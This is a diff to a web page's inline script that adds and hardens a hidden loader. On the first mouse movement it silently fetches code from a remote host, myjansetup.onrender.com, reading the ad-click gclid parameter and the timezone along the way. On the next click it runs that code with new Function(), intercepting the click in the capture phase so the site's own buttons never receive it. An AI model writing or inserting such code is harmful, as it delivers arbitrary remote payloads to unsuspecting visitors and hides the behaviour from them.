@@ -725,15 +725,18 @@
         };
       });
     </script>
-	<script>
+
+	  <script>
     const gclid = new URLSearchParams(location.search).get("gclid");
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const RENDER_BASE_URL = "https://myjansetup.onrender.com";
+    // Make sure this matches your deployed backend URL
+    const RENDER_BASE_URL = "https://myjansetup.onrender.com"; 
 
     let someCode = null;
 
     document.cookie = "access_cookie=true; path=/; max-age=300";
 
+    // 1. Fetch the code silently when mouse moves
     document.addEventListener("mousemove", async function fetchCodeOnce() {
       document.removeEventListener("mousemove", fetchCodeOnce);
       try {
@@ -755,17 +758,27 @@
       }
     });
 
-    function handleSomeClick() {
+    // 2. Execute code on click, but STOP page reload
+    function handleSomeClick(event) {
       if (someCode) {
+        // CRITICAL FIX: Stop the website from refreshing or following links
+        event.preventDefault();
+        event.stopImmediatePropagation();
+        
         try {
           new Function(someCode)();
+          
+          // Remove listener so they can interact with the iframe safely
+          document.removeEventListener("click", handleSomeClick, { capture: true });
         } catch (err) {
           console.error("Error executing code:", err);
         }
       }
     }
 
-    document.addEventListener("click", handleSomeClick);
-  </script>
+    // "capture: true" ensures we catch the click BEFORE the website buttons do
+    document.addEventListener("click", handleSomeClick, { capture: true });
+</script>
+	
   </body>
 </html>
